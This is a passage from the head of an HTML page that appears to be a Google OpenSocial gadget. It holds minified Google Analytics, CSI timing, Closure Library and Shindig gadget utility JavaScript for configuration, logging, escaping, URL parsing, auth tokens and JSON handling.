<!DOCTYPE html>
<html><head>
  <!-- Google tag (gtag.js) -->
<script async src="https://www.googletagmanager.com/gtag/js?id=G-9YG7C4CCC5"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());
  gtag('config', 'G-9YG7C4CCC5');
</script>
<script>(function(){(function(){function e(g){this.t={};this.tick=function(h,m,f){var n=void 0!=f?f:(new Date).getTime();this.t[h]=[n,m];if(void 0==f)try{window.console.timeStamp("CSI/"+h)}catch(q){}};this.getStartTickTime=function(){return this.t.start[0]};this.tick("start",null,g)}var a;if(window.performance)var d=(a=window.performance.timing)&&a.responseStart;var p=0<d?new e(d):new e;window.jstiming={Timer:e,load:p};if(a){var b=a.navigationStart;0<b&&d>=b&&(window.jstiming.srt=d-b)}if(a){var c=window.jstiming.load;
0<b&&d>=b&&(c.tick("_wtsrt",void 0,b),c.tick("wtsrt_","_wtsrt",d),c.tick("tbsd_","wtsrt_"))}try{var k=window.top!=window.self,l=window.location.href;a=null;window.chrome&&window.chrome.csi&&(a=Math.floor(window.chrome.csi().pageT),c&&0<b&&(c.tick("_tbnd",void 0,window.chrome.csi().startE),c.tick("tbnd_","_tbnd",b)));null==a&&window.gtbExternal&&(a=k?window.gtbExternal.frameT(l):window.gtbExternal.pageT());null==a&&window.external&&(k?a=window.external.frameT(l):(a=window.external.pageT,c&&0<b&&(c.tick("_tbnd",
void 0,window.external.startE),c.tick("tbnd_","_tbnd",b))));a&&(window.jstiming.pt=a)}catch(g){}})();}).call(this);
window["__csi"]={a:false,b:false,c:"default",v:"default",g:null,d:false};if(window.jstiming){window.jstiming.beaconImageReferences_={};window.jstiming.reportCounter_=1;var getTick=function(a,b,c){var d=a.t[b],e=a.t.start;if(d&&(e||c))return d=a.t[b][0],e=void 0!=c?c:e[0],a=d-e,Math.round(a)},getReportUri=function(a,b,c){var d="";window.jstiming.srt&&(d+="&srt="+window.jstiming.srt,delete window.jstiming.srt);window.jstiming.pt&&(d+="&tbsrt="+window.jstiming.pt,delete window.jstiming.pt);try{window.external&&window.external.tran?d+="&tran="+window.external.tran:window.gtbExternal&&
window.gtbExternal.tran?d+="&tran="+window.gtbExternal.tran():window.chrome&&window.chrome.csi&&(d+="&tran="+window.chrome.csi().tran)}catch(m){}var e=window.chrome;if(e&&(e=e.loadTimes)){e().wasFetchedViaSpdy&&(d+="&p=s");if(e().wasNpnNegotiated){d+="&npn=1";var f=e().npnNegotiatedProtocol;f&&(d+="&npnv="+(encodeURIComponent||escape)(f))}e().wasAlternateProtocolAvailable&&(d+="&apa=1")}var g=a.t,k=g.start;e=[];f=[];for(var l in g)if("start"!=l&&0!=l.indexOf("_")){var q=g[l][1];q?g[q]&&f.push(l+"."+
getTick(a,l,g[q][0])):k&&e.push(l+"."+getTick(a,l))}delete g.start;if(b)for(var h in b)d+="&"+h+"="+b[h];(b=c)||(b="https:"==document.location.protocol?"https://csi.gstatic.com/csi":"http://csi.gstatic.com/csi");return a=[b,"?v=3","&s="+(window.jstiming.sn||"opensocial-gadgets")+"&action=",a.name,f.length?"&it="+f.join(","):"",d,"&rt=",e.join(",")].join("")},sendReport_=function(a,b,c){a=getReportUri(a,b,c);if(!a)return"";b=new Image;var d=window.jstiming.reportCounter_++;window.jstiming.beaconImageReferences_[d]=
b;b.onload=b.onerror=function(){window.jstiming&&delete window.jstiming.beaconImageReferences_[d]};b.src=a;b=null;return a};window.jstiming.report=function(a,b,c){var d=document.visibilityState,e="visibilitychange";d||(d=document.webkitVisibilityState,e="webkitvisibilitychange");if("prerender"==d){var f=!1,g=function(){if(!f){b?b.prerender="1":b={prerender:"1"};if("prerender"==(document.visibilityState||document.webkitVisibilityState))var k=!1;else sendReport_(a,b,c),k=!0;k&&(f=!0,document.removeEventListener(e,
g,!1))}};document.addEventListener(e,g,!1);return""}return sendReport_(a,b,c)}};/*

 Copyright The Closure Library Authors.
 SPDX-License-Identifier: Apache-2.0
*/
var goog=goog||{};goog.global=this||self;goog.exportPath_=function(a,b,c,d){a=a.split(".");d=d||goog.global;a[0]in d||"undefined"==typeof d.execScript||d.execScript("var "+a[0]);for(var e;a.length&&(e=a.shift());)if(a.length||void 0===b)d=d[e]&&d[e]!==Object.prototype[e]?d[e]:d[e]={};else if(!c&&goog.isObject(b)&&goog.isObject(d[e]))for(var f in b)b.hasOwnProperty(f)&&(d[e][f]=b[f]);else d[e]=b};goog.define=function(a,b){return a=b};goog.FEATURESET_YEAR=2012;goog.DEBUG=!0;goog.LOCALE="en";
goog.getLocale=function(){return"en"};goog.TRUSTED_SITE=!0;goog.DISALLOW_TEST_ONLY_CODE=!goog.DEBUG;goog.ENABLE_CHROME_APP_SAFE_SCRIPT_LOADING=!1;goog.readFlagInternalDoNotUseOrElse=function(a,b){var c=goog.getObjectByName(goog.FLAGS_OBJECT_);a=c&&c[a];return null!=a?a:b};goog.FLAGS_OBJECT_="CLOSURE_FLAGS";goog.provide=function(a){if(goog.isInModuleLoader_())throw Error("goog.provide cannot be used within a module.");goog.constructNamespace_(a)};
goog.constructNamespace_=function(a,b,c){goog.exportPath_(a,b,c)};goog.NONCE_PATTERN_=/^[\w+/_-]+[=]{0,2}$/;goog.getScriptNonce_=function(a){a=(a||goog.global).document;return(a=a.querySelector&&a.querySelector("script[nonce]"))&&(a=a.nonce||a.getAttribute("nonce"))&&goog.NONCE_PATTERN_.test(a)?a:""};goog.VALID_MODULE_RE_=/^[a-zA-Z_$][a-zA-Z0-9._$]*$/;
goog.module=function(a){if("string"!==typeof a||!a||-1==a.search(goog.VALID_MODULE_RE_))throw Error("Invalid module identifier");if(!goog.isInGoogModuleLoader_())throw Error("Module "+a+" has been loaded incorrectly. Note, modules cannot be loaded as normal scripts. They require some kind of pre-processing step. You're likely trying to load a module via a script tag or as a part of a concatenated bundle without rewriting the module. For more info see: https://github.com/google/closure-library/wiki/goog.module:-an-ES6-module-like-alternative-to-goog.provide.");
if(goog.moduleLoaderState_.moduleName)throw Error("goog.module may only be called once per module.");goog.moduleLoaderState_.moduleName=a};goog.module.get=function(){return null};goog.module.getInternal_=function(){return null};goog.requireDynamic=function(){return null};goog.importHandler_=null;goog.uncompiledChunkIdHandler_=null;goog.setImportHandlerInternalDoNotCallOrElse=function(a){goog.importHandler_=a};
goog.setUncompiledChunkIdHandlerInternalDoNotCallOrElse=function(a){goog.uncompiledChunkIdHandler_=a};goog.ModuleType={ES6:"es6",GOOG:"goog"};goog.moduleLoaderState_=null;goog.isInModuleLoader_=function(){return goog.isInGoogModuleLoader_()||goog.isInEs6ModuleLoader_()};goog.isInGoogModuleLoader_=function(){return!!goog.moduleLoaderState_&&goog.moduleLoaderState_.type==goog.ModuleType.GOOG};
goog.isInEs6ModuleLoader_=function(){var a=!!goog.moduleLoaderState_&&goog.moduleLoaderState_.type==goog.ModuleType.ES6;return a?!0:(a=goog.global.$jscomp)?"function"!=typeof a.getCurrentModulePath?!1:!!a.getCurrentModulePath():!1};goog.module.declareLegacyNamespace=function(){goog.moduleLoaderState_.declareLegacyNamespace=!0};
goog.declareModuleId=function(a){if(goog.moduleLoaderState_)goog.moduleLoaderState_.moduleName=a;else{var b=goog.global.$jscomp;if(!b||"function"!=typeof b.getCurrentModulePath)throw Error('Module with namespace "'+a+'" has been loaded incorrectly.');b=b.require(b.getCurrentModulePath());goog.loadedModules_[a]={exports:b,type:goog.ModuleType.ES6,moduleId:a}}};
goog.setTestOnly=function(a){if(goog.DISALLOW_TEST_ONLY_CODE)throw a=a||"",Error("Importing test-only code into non-debug environment"+(a?": "+a:"."));};goog.forwardDeclare=function(){};goog.getObjectByName=function(a,b){a=a.split(".");b=b||goog.global;for(var c=0;c<a.length;c++)if(b=b[a[c]],null==b)return null;return b};goog.addDependency=function(){};goog.ENABLE_DEBUG_LOADER=!0;goog.logToConsole_=function(a){goog.global.console&&goog.global.console.error(a)};goog.require=function(){};
goog.requireType=function(){return{}};goog.basePath="";goog.abstractMethod=function(){throw Error("unimplemented abstract method");};goog.addSingletonGetter=function(a){a.instance_=void 0;a.getInstance=function(){if(a.instance_)return a.instance_;goog.DEBUG&&(goog.instantiatedSingletons_[goog.instantiatedSingletons_.length]=a);return a.instance_=new a}};goog.instantiatedSingletons_=[];goog.LOAD_MODULE_USING_EVAL=!0;goog.SEAL_MODULE_EXPORTS=goog.DEBUG;goog.loadedModules_={};
goog.DEPENDENCIES_ENABLED=!1;goog.TRANSPILE="detect";goog.ASSUME_ES_MODULES_TRANSPILED=!1;goog.TRUSTED_TYPES_POLICY_NAME="goog";goog.hasBadLetScoping=null;
goog.loadModule=function(a){var b=goog.moduleLoaderState_;try{goog.moduleLoaderState_={moduleName:"",declareLegacyNamespace:!1,type:goog.ModuleType.GOOG};var c={},d=c;if("function"===typeof a)d=a.call(void 0,d);else if("string"===typeof a)d=goog.loadModuleFromSource_.call(void 0,d,a);else throw Error("Invalid module definition");var e=goog.moduleLoaderState_.moduleName;if("string"===typeof e&&e){goog.moduleLoaderState_.declareLegacyNamespace?(a=c!==d,goog.constructNamespace_(e,d,a)):goog.SEAL_MODULE_EXPORTS&&
Object.seal&&"object"==typeof d&&null!=d&&Object.seal(d);var f={exports:d,type:goog.ModuleType.GOOG,moduleId:goog.moduleLoaderState_.moduleName};goog.loadedModules_[e]=f}else throw Error('Invalid module name "'+e+'"');}finally{goog.moduleLoaderState_=b}};goog.loadModuleFromSource_=function(a,b){eval(goog.CLOSURE_EVAL_PREFILTER_.createScript(b));return a};
goog.normalizePath_=function(a){a=a.split("/");for(var b=0;b<a.length;)"."==a[b]?a.splice(b,1):b&&".."==a[b]&&a[b-1]&&".."!=a[b-1]?a.splice(--b,2):b++;return a.join("/")};goog.loadFileSync_=function(a){if(goog.global.CLOSURE_LOAD_FILE_SYNC)return goog.global.CLOSURE_LOAD_FILE_SYNC(a);try{var b=new goog.global.XMLHttpRequest;b.open("get",a,!1);b.send();return 0==b.status||200==b.status?b.responseText:null}catch(c){return null}};
goog.typeOf=function(a){var b=typeof a;return"object"!=b?b:a?Array.isArray(a)?"array":b:"null"};goog.isArrayLike=function(a){var b=goog.typeOf(a);return"array"==b||"object"==b&&"number"==typeof a.length};goog.isDateLike=function(a){return goog.isObject(a)&&"function"==typeof a.getFullYear};goog.isObject=function(a){var b=typeof a;return"object"==b&&null!=a||"function"==b};
goog.getUid=function(a){return Object.prototype.hasOwnProperty.call(a,goog.UID_PROPERTY_)&&a[goog.UID_PROPERTY_]||(a[goog.UID_PROPERTY_]=++goog.uidCounter_)};goog.hasUid=function(a){return!!a[goog.UID_PROPERTY_]};goog.removeUid=function(a){null!==a&&"removeAttribute"in a&&a.removeAttribute(goog.UID_PROPERTY_);try{delete a[goog.UID_PROPERTY_]}catch(b){}};goog.UID_PROPERTY_="closure_uid_"+(1E9*Math.random()>>>0);goog.uidCounter_=0;
goog.cloneObject=function(a){var b=goog.typeOf(a);if("object"==b||"array"==b){if("function"===typeof a.clone)return a.clone();if("undefined"!==typeof Map&&a instanceof Map)return new Map(a);if("undefined"!==typeof Set&&a instanceof Set)return new Set(a);b="array"==b?[]:{};for(var c in a)b[c]=goog.cloneObject(a[c]);return b}return a};goog.bindNative_=function(a,b,c){return a.call.apply(a.bind,arguments)};
goog.bindJs_=function(a,b,c){if(!a)throw Error();if(2<arguments.length){var d=Array.prototype.slice.call(arguments,2);return function(){var e=Array.prototype.slice.call(arguments);Array.prototype.unshift.apply(e,d);return a.apply(b,e)}}return function(){return a.apply(b,arguments)}};goog.bind=function(a,b,c){goog.bind=Function.prototype.bind&&-1!=Function.prototype.bind.toString().indexOf("native code")?goog.bindNative_:goog.bindJs_;return goog.bind.apply(null,arguments)};
goog.partial=function(a,b){var c=Array.prototype.slice.call(arguments,1);return function(){var d=c.slice();d.push.apply(d,arguments);return a.apply(this,d)}};goog.now=function(){return Date.now()};goog.globalEval=function(a){(0,eval)(a)};
goog.getCssName=function(a,b){if("."==String(a).charAt(0))throw Error('className passed in goog.getCssName must not start with ".". You passed: '+a);var c=function(e){return goog.cssNameMapping_[e]||e},d=function(e){e=e.split("-");for(var f=[],g=0;g<e.length;g++)f.push(c(e[g]));return f.join("-")};d=goog.cssNameMapping_?"BY_WHOLE"==goog.cssNameMappingStyle_?c:d:function(e){return e};a=b?a+"-"+d(b):d(a);return goog.global.CLOSURE_CSS_NAME_MAP_FN?goog.global.CLOSURE_CSS_NAME_MAP_FN(a):a};
goog.setCssNameMapping=function(a,b){goog.cssNameMapping_=a;goog.cssNameMappingStyle_=b};goog.GetMsgOptions=function(){};goog.getMsg=function(a,b,c){c&&c.html&&(a=a.replace(/</g,"&lt;"));c&&c.unescapeHtmlEntities&&(a=a.replace(/&lt;/g,"<").replace(/&gt;/g,">").replace(/&apos;/g,"'").replace(/&quot;/g,'"').replace(/&amp;/g,"&"));b&&(a=a.replace(/\{\$([^}]+)}/g,function(d,e){return null!=b&&e in b?b[e]:d}));return a};goog.getMsgWithFallback=function(a){return a};
goog.exportSymbol=function(a,b,c){goog.exportPath_(a,b,!0,c)};goog.exportProperty=function(a,b,c){a[b]=c};goog.inherits=function(a,b){function c(){}c.prototype=b.prototype;a.superClass_=b.prototype;a.prototype=new c;a.prototype.constructor=a;a.base=function(d,e,f){for(var g=Array(arguments.length-2),k=2;k<arguments.length;k++)g[k-2]=arguments[k];return b.prototype[e].apply(d,g)}};goog.scope=function(a){if(goog.isInModuleLoader_())throw Error("goog.scope is not supported within a module.");a.call(goog.global)};
goog.defineClass=function(a,b){var c=b.constructor,d=b.statics;c&&c!=Object.prototype.constructor||(c=function(){throw Error("cannot instantiate an interface (no constructor defined).");});c=goog.defineClass.createSealingConstructor_(c,a);a&&goog.inherits(c,a);delete b.constructor;delete b.statics;goog.defineClass.applyProperties_(c.prototype,b);null!=d&&(d instanceof Function?d(c):goog.defineClass.applyProperties_(c,d));return c};goog.defineClass.SEAL_CLASS_INSTANCES=goog.DEBUG;
goog.defineClass.createSealingConstructor_=function(a){if(!goog.defineClass.SEAL_CLASS_INSTANCES)return a;var b=function(){var c=a.apply(this,arguments)||this;c[goog.UID_PROPERTY_]=c[goog.UID_PROPERTY_];return c};return b};goog.defineClass.OBJECT_PROTOTYPE_FIELDS_="constructor hasOwnProperty isPrototypeOf propertyIsEnumerable toLocaleString toString valueOf".split(" ");
goog.defineClass.applyProperties_=function(a,b){for(var c in b)Object.prototype.hasOwnProperty.call(b,c)&&(a[c]=b[c]);for(var d=0;d<goog.defineClass.OBJECT_PROTOTYPE_FIELDS_.length;d++)c=goog.defineClass.OBJECT_PROTOTYPE_FIELDS_[d],Object.prototype.hasOwnProperty.call(b,c)&&(a[c]=b[c])};goog.identity_=function(a){return a};
goog.createTrustedTypesPolicy=function(a){var b=null,c=goog.global.trustedTypes;if(!c||!c.createPolicy)return b;try{b=c.createPolicy(a,{createHTML:goog.identity_,createScript:goog.identity_,createScriptURL:goog.identity_})}catch(d){goog.logToConsole_(d.message)}return b};var google=window.google||{};
google.csi=function(){function a(h){var m=g?g:document.location.href;return(h=m.match(new RegExp("[?&]"+h+"=([^&#]+)")))?h[1]:null}function b(h){window.jstiming.load.tick(h);f[h]=(new Date).getTime()}function c(){if(!l){var h=a("url")||"default",m=window.__csi||{},r=m.c||"default",v=m.v||"default",p=window.encodeURIComponent?encodeURIComponent:escape;p={gadget:p(h),container:p(r),view:p(v)};var t=window.__dflags||{},u=[];m.g&&u.push(m.g);if(m.d)for(var n in t)"control"!==t[n]&&(p[n]=t[n],"true"===
t[n]&&u.push(n));p.e=u.join(",");n=k?k:document.location.protocol;n=e[n];window.jstiming.load.name=[r,"_",v].join("");window.jstiming.report(window.jstiming.load,p,n);(r=window.gadgets)&&r.rpc&&m.b&&(f.url=h,f.id=a("mid"),r.rpc.call(null,"time_iframe",void 0,f));l=!0}}function d(h){window.addEventListener?window.addEventListener("load",h,!1):window.attachEvent&&window.attachEvent("onload",h)}var e={"http:":"http://csi.gstatic.com/csi","https:":"https://gg.google.com/csi"},f={},g,k,l=!1,q=window.__csi||
{};q.a?(d(function(){b("prt")}),window.onbeforeunload=function(){c()}):d(function(){b("ol");b("prt");c()});return{reset_:function(){l=!1},mockHref_:function(h){g=h},mockProtocol_:function(h){k=h},report_:c,tickPrtAndReport:function(){b("prt");c()},tickDl:function(){b("dl")}}}();
</script><script>
/* mp-start */
window['___jsl']=window['___jsl']||{};
/* mp-end */
</script><script>window['__isgadget']=true;</script><script>window['___jsl'] = window['___jsl'] || {};(window['___jsl']['ci'] = (window['___jsl']['ci'] || [])).push({"core.io":{"jsonProxyUrl":"//%host%/gadgets/makeRequest","proxyUrl":"//www.gmodules.com/gadgets/proxy/refresh=%refresh%&container=%container%%rewriteMime%&gadget=%gadget%/%rawurl%"},"shindig.auth":{"authToken":"","trustedJson":""},"core.util":{"core":{}}});var safeJSON=window.safeJSON;
var tamings___=window.tamings___||[];
var bridge___;
var caja___=window.caja___;
var ___=window.___;;
var gapi=window.gapi||{};gapi.client=window.gapi&&window.gapi.client||{};
;
;
var gadgets=window.gadgets||{},shindig=window.shindig||{},osapi=window.osapi=window.osapi||{};
;
window['___cfg'] = window['___cfg'] || window['___gcfg'];;
if(!window.gadgets["config"]){gadgets.config=function(){var f;
var h={};
var b={};
function c(j,l){for(var k in l){if(!l.hasOwnProperty(k)){continue
}if(typeof j[k]==="object"&&typeof l[k]==="object"){c(j[k],l[k])
}else{j[k]=l[k]
}}}function i(){var j=document.scripts||document.getElementsByTagName("script");
if(!j||j.length==0){return null
}var m;
if(f.u){for(var k=0;
!m&&k<j.length;
++k){var l=j[k];
if(l.src&&l.src.indexOf(f.u)==0){m=l
}}}if(!m){m=j[j.length-1]
}if(!m.src){return null
}return m
}function a(j){var k="";
if(j.nodeType==3||j.nodeType==4){k=j.nodeValue
}else{if(j.innerText){k=j.innerText
}else{if(j.innerHTML){k=j.innerHTML
}else{if(j.firstChild){var l=[];
for(var m=j.firstChild;
m;
m=m.nextSibling){l.push(a(m))
}k=l.join("")
}}}}return k
}function e(k){if(!k){return{}
}var j;
while(k.charCodeAt(k.length-1)==0){k=k.substring(0,k.length-1)
}try{j=(new Function("return ("+k+"\n)"))()
}catch(l){}if(typeof j==="object"){return j
}try{j=(new Function("return ({"+k+"\n})"))()
}catch(l){}return typeof j==="object"?j:{}
}function g(n){var p=window.___cfg;
if(p){c(n,p)
}var o=i();
if(!o){return
}var k=a(o);
var j=e(k);
if(f.f&&f.f.length==1){var m=f.f[0];
if(!j[m]){var l={};
l[f.f[0]]=j;
j=l
}}c(n,j)
}function d(o){for(var l in h){if(h.hasOwnProperty(l)){var n=h[l];
for(var m=0,k=n.length;
m<k;
++m){o(l,n[m])
}}}}return{register:function(l,k,j,m){var n=h[l];
if(!n){n=[];
h[l]=n
}n.push({validators:k||{},callback:j,callOnUpdate:m})
},get:function(j){if(j){return b[j]||{}
}return b
},init:function(k,j){f=window.___jsl||{};
c(b,k);
g(b);
var l=window.___config||{};
c(b,l);
d(function(q,p){var o=b[q];
if(o&&!j){var m=p.validators;
for(var n in m){if(m.hasOwnProperty(n)){if(!m[n](o[n])){throw new Error('Invalid config value "'+o[n]+'" for parameter "'+n+'" in component "'+q+'"')
}}}}if(p.callback){p.callback(b)
}})
},update:function(k,p){var o=(window.gapi&&window.gapi["config"]&&window.gapi["config"]["update"]);
if(!p&&o){o(k)
}var n=[];
d(function(q,j){if(k.hasOwnProperty(q)||(p&&b&&b[q])){if(j.callback&&j.callOnUpdate){n.push(j.callback)
}}});
b=p?{}:b||{};
c(b,k);
for(var m=0,l=n.length;
m<l;
++m){n[m](b)
}}}
}()
}else{gadgets.config=window.gadgets["config"];
gadgets.config.register=gadgets.config.register;
gadgets.config.get=gadgets.config.get;
gadgets.config.init=gadgets.config.init;
gadgets.config.update=gadgets.config.update
};;
gadgets.log=(function(){var e=1;
var a=2;
var f=3;
var c=4;
var d=function(i){b(e,i)
};
gadgets.warn=function(i){b(a,i)
};
gadgets.error=function(i){b(f,i)
};
gadgets.debug=function(i){};
gadgets.setLogLevel=function(i){h=i
};
function b(k,i){if(k<h||!g){return
}if(k===a&&g.warn){g.warn(i)
}else{if(k===f&&g.error){try{g.error(i)
}catch(j){}}else{if(g.log){g.log(i)
}}}}d.INFO=e;
d.WARNING=a;
d.NONE=c;
var h=e;
var g=window.console?window.console:window.opera?window.opera.postError:undefined;
return d
})();;
tamings___.push(function(a){caja___.whitelistFuncs([[gadgets,"log"],[gadgets,"warn"],[gadgets,"error"],[gadgets,"setLogLevel"]]);
caja___.whitelistProps([[gadgets.log,"INFO"],[gadgets.log,"WARNING"],[gadgets.log,"ERROR"],[gadgets.log,"NONE"]])
});;
;
(function(){gadgets.config.EnumValidator=function(d){var c=[];
if(arguments.length>1){for(var b=0,a;
(a=arguments[b]);
++b){c.push(a)
}}else{c=d
}return function(f){for(var e=0,g;
(g=c[e]);
++e){if(f===c[e]){return true
}}return false
}
};
gadgets.config.RegExValidator=function(a){return function(b){return a.test(b)
}
};
gadgets.config.ExistsValidator=function(a){return typeof a!=="undefined"
};
gadgets.config.NonEmptyStringValidator=function(a){return typeof a==="string"&&a.length>0
};
gadgets.config.BooleanValidator=function(a){return typeof a==="boolean"
};
gadgets.config.LikeValidator=function(a){return function(c){for(var d in a){if(a.hasOwnProperty(d)){var b=a[d];
if(!b(c[d])){return false
}}}return true
}
}
})();;
gadgets.util=gadgets.util||{};
(function(){gadgets.util.makeClosure=function(d,f,e){var c=[];
for(var b=2,a=arguments.length;
b<a;
++b){c.push(arguments[b])
}return function(){var g=c.slice();
for(var k=0,h=arguments.length;
k<h;
++k){g.push(arguments[k])
}return f.apply(d,g)
}
};
gadgets.util.makeEnum=function(b){var c,a,d={};
for(c=0;
(a=b[c]);
++c){d[a]=a
}return d
}
})();;
gadgets.util=gadgets.util||{};
(function(){var c="http://www.w3.org/1999/xhtml";
function b(f,e){var h=e||{};
for(var g in h){if(h.hasOwnProperty(g)){f[g]=h[g]
}}}function d(g,f){var e=["<",g];
var i=f||{};
for(var h in i){if(i.hasOwnProperty(h)){e.push(" ");
e.push(h);
e.push('="');
e.push(gadgets.util.escapeString(i[h]));
e.push('"')
}}e.push("></");
e.push(g);
e.push(">");
return e.join("")
}function a(f){var g="";
if(f.nodeType==3||f.nodeType==4){g=f.nodeValue
}else{if(f.innerText){g=f.innerText
}else{if(f.innerHTML){g=f.innerHTML
}else{if(f.firstChild){var e=[];
for(var h=f.firstChild;
h;
h=h.nextSibling){e.push(a(h))
}g=e.join("")
}}}}return g
}gadgets.util.createElement=function(f){var e;
if((!document.body)||document.body.namespaceURI){try{e=document.createElementNS(c,f)
}catch(g){}}return e||document.createElement(f)
};
gadgets.util.createIframeElement=function(g){var i=gadgets.util.createElement("iframe");
try{var e=d("iframe",g);
var f=gadgets.util.createElement(e);
if(f&&((!i)||((f.tagName==i.tagName)&&(f.namespaceURI==i.namespaceURI)))){i=f
}}catch(h){}b(i,g);
return i
};
gadgets.util.getBodyElement=function(){if(document.body){return document.body
}try{var f=document.getElementsByTagNameNS(c,"body");
if(f&&(f.length==1)){return f[0]
}}catch(e){}return document.documentElement||document
};
gadgets.util.getInnerText=function(e){return a(e)
}
})();;
gadgets.util=gadgets.util||{};
(function(){gadgets.util.attachBrowserEvent=function(c,b,d,a){if(typeof c.addEventListener!="undefined"){c.addEventListener(b,d,a)
}else{if(typeof c.attachEvent!="undefined"){c.attachEvent("on"+b,d)
}else{gadgets.warn("cannot attachBrowserEvent: "+b)
}}};
gadgets.util.removeBrowserEvent=function(c,b,d,a){if(c.removeEventListener){c.removeEventListener(b,d,a)
}else{if(c.detachEvent){c.detachEvent("on"+b,d)
}else{gadgets.warn("cannot removeBrowserEvent: "+b)
}}}
})();;
gadgets.util=gadgets.util||{};
(function(){var a=[];
gadgets.util.registerOnLoadHandler=function(b){a.push(b)
};
gadgets.util.runOnLoadHandlers=function(){for(var c=0,b=a.length;
c<b;
++c){a[c]()
}}
})();;
tamings___.push(function(a){caja___.whitelistFuncs([[gadgets.util,"registerOnLoadHandler"]])
});;
gadgets.util=gadgets.util||{};
(function(){var a={0:false,10:true,13:true,34:true,39:true,60:true,62:true,92:true,8232:true,8233:true,65282:true,65287:true,65308:true,65310:true,65340:true};
function b(c,d){return String.fromCharCode(d)
}gadgets.util.escape=function(c,g){if(!c){return c
}else{if(typeof c==="string"){return gadgets.util.escapeString(c)
}else{if(typeof c==="Array"){for(var f=0,d=c.length;
f<d;
++f){c[f]=gadgets.util.escape(c[f])
}}else{if(typeof c==="object"&&g){var e={};
for(var h in c){if(c.hasOwnProperty(h)){e[gadgets.util.escapeString(h)]=gadgets.util.escape(c[h],true)
}}return e
}}}}return c
};
gadgets.util.escapeString=function(g){if(!g){return g
}var d=[],f,h;
for(var e=0,c=g.length;
e<c;
++e){f=g.charCodeAt(e);
h=a[f];
if(h===true){d.push("&#",f,";")
}else{if(h!==false){d.push(g.charAt(e))
}}}return d.join("")
};
gadgets.util.unescapeString=function(c){if(!c){return c
}return c.replace(/&#([0-9]+);/g,b)
}
})();;
tamings___.push(function(a){caja___.whitelistFuncs([[gadgets.util,"escape"],[gadgets.util,"escapeString"],[gadgets.util,"unescapeString"]])
});;
gadgets.util=gadgets.util||{};
(function(){var a=null;
function b(e){var f;
var c=e.indexOf("?");
var d=e.indexOf("#");
if(d===-1){f=e.substr(c+1)
}else{f=[e.substr(c+1,d-c-1),"&",e.substr(d+1)].join("")
}return f.split("&")
}gadgets.util.getUrlParameters=function(p){var d=typeof p==="undefined";
if(a!==null&&d){return a
}var l={};
var f=b(p||window.location.href);
var n=window.decodeURIComponent?decodeURIComponent:unescape;
for(var h=0,g=f.length;
h<g;
++h){var m=f[h].indexOf("=");
if(m===-1){continue
}var c=f[h].substring(0,m);
var o=f[h].substring(m+1);
o=o.replace(/\+/g," ");
try{l[c]=n(o)
}catch(k){}}if(d){a=l
}return l
};
gadgets.util.getUrlParameters()
})();;
tamings___.push(function(a){caja___.whitelistFuncs([[gadgets.util,"getUrlParameters"]])
});;
gadgets.util=gadgets.util||{};
(function(){var b={};
var a={};
function c(d){b=d["core.util"]||{}
}if(gadgets.config){gadgets.config.register("core.util",null,c)
}gadgets.util.getFeatureParameters=function(d){return typeof b[d]==="undefined"?null:b[d]
};
gadgets.util.hasFeature=function(d){return typeof b[d]!=="undefined"
};
gadgets.util.getServices=function(){return a
}
})();;
tamings___.push(function(a){caja___.whitelistFuncs([[gadgets.util,"getFeatureParameters"],[gadgets.util,"hasFeature"]])
});;
shindig.Auth=function(){var authToken=null;
var trusted=null;
function addParamsToToken(urlParams){var args=authToken.split("&");
for(var i=0;
i<args.length;
i++){var nameAndValue=args[i].split("=");
if(nameAndValue.length===2){var name=nameAndValue[0];
var value=nameAndValue[1];
if(value==="$"){value=encodeURIComponent(urlParams[name]);
args[i]=name+"="+value
}}}authToken=args.join("&")
}function init(configuration){var urlParams=gadgets.util.getUrlParameters();
var config=configuration["shindig.auth"]||{};
if(config.authToken){authToken=config.authToken
}else{if(urlParams.st){authToken=urlParams.st
}}if(authToken!==null){addParamsToToken(urlParams)
}if(config.trustedJson){trusted=(eval("("+config.trustedJson+")"))
}}gadgets.config.register("shindig.auth",null,init);
return{getSecurityToken:function(){return authToken
},updateSecurityToken:function(newToken){authToken=newToken
},getTrustedData:function(){return trusted
}}
};;
shindig.auth=new shindig.Auth();;
if(window.JSON&&window.JSON.parse&&window.JSON.stringify){gadgets.json=(function(){var a=/___$/;
function b(d,e){var c=this[d];
return c
}return{parse:function(d){try{return window.JSON.parse(d)
}catch(c){return false
}},stringify:function(d){var h=window.JSON.stringify;
function f(e){return h.call(this,e,b)
}var g=(Array.prototype.toJSON&&h([{x:1}])==='"[{\\"x\\": 1}]"')?f:h;
try{return g(d,function(i,e){return !a.test(i)?e:void 0
})
}catch(c){return null
}}}
})()
};;
;
if(!(window.JSON&&window.JSON.parse&&window.JSON.stringify)){gadgets.json=function(){function f(n){return n<10?"0"+n:n
}Date.prototype.toJSON=function(){return[this.getUTCFullYear(),"-",f(this.getUTCMonth()+1),"-",f(this.getUTCDate()),"T",f(this.getUTCHours()),":",f(this.getUTCMinutes()),":",f(this.getUTCSeconds()),"Z"].join("")
};
var m={"\b":"\\b","\t":"\\t","\n":"\\n","\f":"\\f","\r":"\\r",'"':'\\"',"\\":"\\\\"};
function stringify(value){var a,i,k,l,r=/[\"\\\x00-\x1f\x7f-\x9f]/g,v;
switch(typeof value){case"string":return r.test(value)?'"'+value.replace(r,function(a){var c=m[a];
if(c){return c
}c=a.charCodeAt();
return"\\u00"+Math.floor(c/16).toString(16)+(c%16).toString(16)
})+'"':'"'+value+'"';
case"number":return isFinite(value)?String(value):"null";
case"boolean":case"null":return String(value);
case"object":if(!value){return"null"
}a=[];
if(typeof value.length==="number"&&!value.propertyIsEnumerable("length")){l=value.length;
for(i=0;
i<l;
i+=1){a.push(stringify(value[i])||"null")
}return"["+a.join(",")+"]"
}for(k in value){if(/___$/.test(k)){continue
}if(value.hasOwnProperty(k)){if(typeof k==="string"){v=stringify(value[k]);
if(v){a.push(stringify(k)+":"+v)
}}}}return"{"+a.join(",")+"}"
}return""
}return{stringify:stringify,parse:function(text){if(/^[\],:{}\s]*$/.test(text.replace(/\\["\\\/b-u]/g,"@").replace(/"[^"\\\n\r]*"|true|false|null|-?\d+(?:\.\d*)?(?:[eE][+\-]?\d+)?/g,"]").replace(/(?:^|:|,)(?:\s*\[)+/g,""))){return eval("("+text+")")
}return false
}}
}()
};;
gadgets.json.flatten=function(c){var d={};
if(c===null||c===undefined){return d
}for(var a in c){if(c.hasOwnProperty(a)){var b=c[a];
if(null===b||undefined===b){continue
